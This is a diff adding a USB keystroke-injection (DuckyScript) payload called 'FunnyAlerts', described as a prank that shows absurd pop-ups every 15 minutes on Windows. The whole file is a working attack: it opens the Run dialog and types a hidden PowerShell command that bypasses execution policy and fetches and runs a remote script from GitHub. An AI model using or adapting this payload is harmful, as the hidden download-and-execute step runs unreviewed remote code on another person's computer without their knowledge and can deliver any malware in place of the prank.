@@ -1,0 +1,10 @@
+REM Title: FunnyAlerts
+REM Author: dsymbol
+REM Description: Hidden PowerShell script that launches a pop-up message every 15 minutes with a funny or absurd message
+REM Target: Windows
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass irm https://raw.githubusercontent.com/dsymbol/ducky-payloads/main/FunnyAlerts/fa.ps1 | iex
+ENTER
